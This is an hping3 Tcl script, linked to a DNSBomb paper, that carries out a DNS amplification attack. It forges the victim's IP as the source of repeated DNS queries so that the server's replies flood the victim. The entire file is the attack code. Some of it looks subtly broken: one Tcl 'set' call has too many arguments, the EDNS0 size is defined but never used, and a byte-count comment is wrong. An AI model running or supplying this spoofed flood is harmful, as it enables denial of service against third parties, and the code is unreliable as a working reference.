#!/usr/bin/hping3 --tcl
# https://lixiang521.com/publication/oakland24-2/sp24summer-dnsbomb-li.pdf

source hpingstdlib.htcl

# Ensure correct number of arguments
if { $argc != 2 } {
    puts "Usage: $argv0 <VICTIM_SERVER> <DNS_SERVER>"
    exit
}

# Get the victim server and DNS server from the command line arguments
set DEST_IP [lindex $argv 0]    ;# Victim server IP address
set DNS_SERVER [lindex $argv 1] ;# Target DNS server IP address

# Interval between sending each query in seconds
set QUERY_INTERVAL 0.01
# Number of queries to send
set NUM_QUERIES 1000
# EDNS0 size for the response packet
set EDNS0_SIZE 4096
# Domain to query (large domain to ensure a large response)
set TARGET_DOMAIN "example.com"

# Function to build DNS query
proc build_dns_query {} {
    # Transaction ID (2 bytes)
    set txid \x12\x34
    # Flags (2 bytes): Standard query, Recursion Desired
    set flags \x01\x00
    # Questions (2 bytes): 1 question
    set qdcount \x00\x01
    # Answer RRs (2 bytes): 0 answers
    set ancount \x00\x00
    # Authority RRs (2 bytes): 0 authority records
    set nscount \x00\x00
    # Additional RRs (2 bytes): 0 additional records
    set arcount \x00\x00
    # Query name: "example.com" (3 bytes for 'com', 7 bytes for 'example', 1 byte for root, 1 byte for null terminator)
    set qname \x07example\x03com\x00
    # Query type (2 bytes): A record (host address)
    set qtype \x00\x01
    # Query class (2 bytes): IN (internet)
    set qclass \x00\x01
    
    # Concatenate all parts to form the full DNS query
    return "$txid$flags$qdcount$ancount$nscount$arcount$qname$qtype$qclass"
}

# Function to build and send UDP packets using hping3's send function
proc send_udp_packet {src_ip dest_ip dest_port data} {
    # Building the packet with hping's internal functions
    set probe [hping_udp_packet new]
    $probe set ip_dst $dest_ip
    $probe set ip_src $src_ip
    $probe set ip_ttl 64
    $probe set udp_dport $dest_port
    $probe set udp_data $data
    return $probe
}

# Function to perform DNS amplification attack
proc perform_attack {victim_ip dns_server_ip} {
    set query [build_dns_query]
    # Calculate rate-limit values
    set rate 1 / $::QUERY_INTERVAL  ;# Number of queries to send per second

    for {set i 0} {$i < $::NUM_QUERIES} {incr i} {
        set probe [send_udp_packet $victim_ip $dns_server_ip 53 $query]
        hping send $probe
        after [expr {int($::QUERY_INTERVAL * 1000)}]  ;# Wait between sends to control the rate
    }
}

# Execute the attack
perform_attack $DEST_IP $DNS_SERVER
